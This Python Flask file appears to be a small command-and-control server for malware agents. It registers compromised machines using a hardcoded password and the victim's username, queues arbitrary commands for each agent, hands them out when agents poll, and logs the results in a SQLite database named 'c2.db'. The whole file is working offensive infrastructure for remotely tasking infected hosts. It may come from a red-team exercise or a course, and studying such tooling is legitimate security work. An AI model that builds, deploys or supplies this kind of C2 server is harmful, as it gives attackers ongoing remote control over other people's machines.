from mimetypes import common_types
from flask import Flask , request, jsonify
from flask_sqlalchemy import SQLAlchemy
import os

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
db = SQLAlchemy(app)


#job_cache = {}

password = "Claws"


class Agent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String)
    username = db.Column(db.String)

CREATED = "CREATED"
TASKED = 'TASKED'
DONE = "DONE"


# ORM for a task 
class Task(db.Model):
    id= db.Column(db.Integer, primary_key=True)
    job_id = db.Column(db.String)
    command_type = db.Column(db.String)
    cmd = db.Column(db.String)
    Status = db.Column(db.String)
    agent_id = db.Column(db.String)


def find_agent_by_id(id_):
    return Agent.query.filter_by(agent_id=id_).first()

def make_job_id():
    return os.urandom(16).hex()

@app.route("/tasks/create", methods=["POST"])
def create_task():
    data = request.json
    if data == None:
        return jsonify({"status": "bad task!"})

    # error checking 
    task_type = data.get("type")
    task_command = data.get("cmd")
    agent_id = data.get("agent_id")
    agent = find_agent_by_id(agent_id)
    if agent == None:
        return jsonify({"status": "no agent with that ID"})
    task = Task(
        job_id= make_job_id() ,
        command_type = task_type, 
        cmd = task_command, 
        Status=CREATED,
        agent_id= agent_id
    )
    db.session.add(task)
    db.session.commit()
    print(f"[+] A new task has been created for {agent_id}")
    return jsonify({"status": "ok", "message": task.job_id})

@app.route("/tasks/list", methods=["GET"])
def list_tasks():
    tasks = Task.query.all()
    t = [{"job_id": i.job_id, "agent_id": i.agent_id, "status": i.Status, "type": i.command_type,"cmd": i.cmd} for i in tasks]
    return jsonify(t)

# we get get/recieve job reqeusts/response
@app.route("/tasks", methods = [ "POST"])
def tasking():
    data = request.json
    if data == None:
        return jsonify({"status": "Bad", "message": "boo you!"})
    
    job_id = data.get("job_id")
    agent_id = data.get("agent_id")
    task_result = data.get("task_response")
    if task_result:
        for response in task_result:
            t_job_id = response.get("job_id")
            t_job_resp = response.get("result")
            task = Task.query.filter_by(job_id = t_job_id).first()
            if task.Status != TASKED:
                print("[+] Possible replay attack!", task)
            else:
                print(f"[+] Agent responded to job {t_job_id} with result: {t_job_resp}" )
                task.Status = DONE
                db.session.commit()

            # we need to set the task to compiled 

    agent = find_agent_by_id(agent_id)

    # invalid agent 
    if agent == None:
        return jsonify({"status": "Bad", "message": "Bad agent!"})
    
    task = Task.query.filter_by(agent_id=agent_id, Status = CREATED).first()
    if task == None:
        # no work to be done
        return jsonify({})
    else:
        # have tasked the agent
        task.Status = TASKED
        db.session.commit()
        return jsonify({
            "status": "ok",
            "type": task.command_type, 
            "cmd": task.cmd,
            "job_id": task.job_id
        })










@app.route("/agents/list")
def list_agents() :
    agents = Agent.query.all()
    agent_ids = [i.agent_id  for i in agents]
    return jsonify(agent_ids)


# todo: use flask blueprints 
@app.route("/register", methods=["POST"]) # <-- route 
def register():# <-- handler 
    #print(request)
    reg_data = request.json
    reg_password = reg_data.get("password")
    if password == reg_password:
        print("Authenticated!")
    else:
        return jsonify({"status": "Failed", "message": "Bad password!"})

    whoami = reg_data.get("whoami")
    agent_id = reg_data.get("agent_id")
    agent =  Agent(agent_id = agent_id, username=whoami)
    db.session.add(agent)
    print(f"[+] A new agent {agent.id} has connected to our server! {agent.agent_id}, {agent.username}")

    db.session.commit()
    return jsonify({"status": "ok", "message": "Welcome!"})


if __name__ == "__main__":
    app.run()


